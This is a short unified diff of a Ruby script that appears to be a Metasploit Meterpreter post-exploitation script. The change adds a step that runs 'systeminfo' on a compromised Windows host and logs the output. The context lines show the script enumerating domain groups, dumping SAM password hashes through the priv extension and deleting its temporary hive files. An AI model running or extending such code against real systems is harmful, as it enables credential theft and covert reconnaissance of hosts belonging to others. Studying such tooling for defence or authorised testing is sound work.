@@ -45,7 +45,7 @@ def m_exec(session, cmd)
 	while(d = r.channel.read)
 		b << d
 	end
-	r.channel.close			
+	r.channel.close
 	r.close
 	b
 end
@@ -122,6 +122,10 @@ begin
 		fd.puts(m_exec(session, "net group"))
 	end
 
+	::File.open(File.join(logs, "systeminfo.txt"), "w") do |fd|
+		fd.puts(m_exec(session, "systeminfo"))
+	end
+
 	begin
 		session.core.use("priv")
 		hashes = session.priv.sam_hashes
@@ -149,9 +153,10 @@ begin
 		print_status(" Cleaning #{hive}")
 		m_unlink(session, tempname)
 	end
-	
+
 	print_status("Completed processing on #{host}:#{port}...")
-	
+
 rescue ::Exception => e
 	print_status("Exception: #{e.class} #{e} #{e.backtrace}")
 end
+
